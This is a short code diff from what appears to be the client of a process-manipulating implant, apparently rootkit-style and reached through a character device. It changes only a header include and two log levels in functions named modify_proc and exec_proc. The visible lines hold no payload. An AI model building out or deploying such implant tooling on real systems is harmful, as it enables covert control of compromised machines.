@@ -1,6 +1,6 @@
 #include <client.h>
 #include <process.h>
-#include <debug.h>
+#include <log.h>
 #include <commands.h>
 
 #include <stdio.h>
@@ -11,7 +11,7 @@ int modify_proc(char *cmd, pid_t pid)
 {
 	FILE *implant = fopen(IMPLANT_CHRDEV_PATH, "w");
 	if (implant == NULL) {
-		IMLOG_WARN("Failed to access the implant interface");
+		IMLOG_ERR("Failed to access the implant interface");
 		return -1;
 	}
 
@@ -32,7 +32,7 @@ int exec_proc(char *args)
 	FILE *implant = fopen(IMPLANT_CHRDEV_PATH, "w");
 	if (!implant) {
 		ret = -1;
-		IMLOG_WARN("Failed to access the implant interface");
+		IMLOG_ERR("Failed to access the implant interface");
 		goto err;
 	}
 
